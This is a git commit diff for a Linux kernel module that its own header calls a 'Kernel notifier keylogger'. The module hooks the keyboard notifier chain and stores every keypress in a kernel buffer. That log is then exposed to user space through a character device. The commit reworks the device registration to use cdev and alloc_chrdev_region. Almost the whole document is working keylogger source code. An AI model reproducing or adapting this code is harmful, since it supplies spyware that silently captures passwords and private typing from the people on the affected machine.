e79463d89b249f02fb596be23f40afea503897ad
ilona <ilona@DESKTOP-MLKFABG>
2021-06-26 04:23:52 +0300

    update

--- knk-yi.c
+++ knk-yi.c
@@ -1,14 +1,22 @@
-//Kernel notifier keylogger Yonor & Elona
-//
+//Kernel notifier keylogger Yonor & ilona
+
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
 #include <linux/fs.h>
+#include <linux/cdev.h>
 #include <linux/uaccess.h>
 #include <linux/notifier.h>
 
-#define DEVICE_NAME "keylog0"  // Name of the device
-static int major;  // Major number for CHARDEV
+#define DEVICE_NAME "key_log"  // the name of this device
+
+/*global veriabls*/
+int major_num=0;
+int minor_num=0;
+
+
+struct cdev cdev;/*char device structure*/
+dev_t dev = 0;
 
 // Keylogger Info
 #define BUFFER_LEN 1024
@@ -16,19 +24,34 @@ static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged
 static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
 int buf_pos = 0;  // Counting characters to avoid overflow
 
+/*parameters of the module-->without permissions*/
+module_param(major_num,int,0);
+module_param(minor_num,int,0);
+
 // Prototypes
+void keylog_exit(void);
 static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
 
-// Setting the Device Driver read function
-static struct file_operations fops = {
+
+
+
+
+/*connect our function to the function pointer in fops struct
+ *Setting the Device Driver read function
+ * */
+
+ //connect our function to it function pointer in fops struct
+struct file_operations fops = {
+	.owner = THIS_MODULE,
 	.read = dev_read
-};
+	};
+
 
 // Initializing the notifier_block
 static struct notifier_block nb = {
 	.notifier_call = keys_pressed
-};
+}; 
 
 
 static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
@@ -47,6 +70,8 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 			buf_pos++;
 		}
 		
+		
+		
 		// Beware of buffer overflows in kernel space!! They can be catastrophic!
 		//Prevents the OS to cracked in event of OVERFLOW
 		if (buf_pos >= BUFFER_LEN) {
@@ -54,15 +79,19 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 			memset(keys_buffer, 0, BUFFER_LEN);
 			keys_bf_ptr = keys_buffer;
 		}
-	}	
-	return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
+	}
+		return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
 }
 
+
 // Device driver read function
-static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) {
+static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) 
+{
+	
 	int len = strlen(keys_buffer);
 	int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
-	if (ret) {
+	if (ret) 
+	{
 		printk(KERN_INFO "Couldn't copy all data to user space\n");
 		return ret;
 	}
@@ -71,25 +100,61 @@ static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t
 	return len;
 }
 
-static int __init keylog_init(void) {
-	major = register_chrdev(0, DEVICE_NAME, &fops);
-	if (major < 0) {
-		printk(KERN_ALERT "keylog failed to register a major number\n");
-		return major;
-	}
+
+
+
+
 	
-	printk(KERN_INFO "Registered keylogger with major number %d", major);	
+
+void my_setup_keydev(void)
+{
+	int res=0;
+	cdev_init(&cdev, &fops);/*initialize cdev & connect to char_fops*/
+	cdev.owner = THIS_MODULE;
+	res = cdev_add(&cdev,dev,1);
+	if(res)
+	{
+		printk(KERN_NOTICE "Error adding char device res = %d\n" , res);
+	}
+}
+
+
+static int __init keylog_init(void)
+{
+	int err=0;
+	err=alloc_chrdev_region(&dev,minor_num,1,THIS_MODULE->name);/*kernel allocate a major num on the fly */
+	if(err<0)
+	{
+		printk(KERN_INFO "iinit_module() : ALLOC FSILURE %d\n" ,major_num );
+		keylog_exit();
+		return err;
+		
+	}
+	my_setup_keydev();
+	major_num=MAJOR(dev);/*obtain the 12 bits for the major number*/
+	
+	printk(KERN_WARNING "init_module() : the o.s gave us major number = %d\n",major_num);
+	printk(KERN_INFO "create node with mknod key_log c %d 0\n",major_num);
+	
 	
 	register_keyboard_notifier(&nb);
 	memset(keys_buffer, 0, BUFFER_LEN);
-	return 0;
+	return 0 ; /*if sucsses rerurn 0*/
+
+	
 }
 
-static void __exit keylog_exit(void) {
-	unregister_chrdev(major, DEVICE_NAME);
+
+ void keylog_exit(void)
+{
+
+	unregister_chrdev_region(major_num,1);
 	unregister_keyboard_notifier(&nb);
-	printk(KERN_INFO "Keylogger unloaded\n");
+	printk(KERN_NOTICE "Keylogger unregister\n");
+	printk(KERN_NOTICE "Keylogger module unloaded\n");
+	
 }
+
 
 module_init(keylog_init);
 module_exit(keylog_exit);
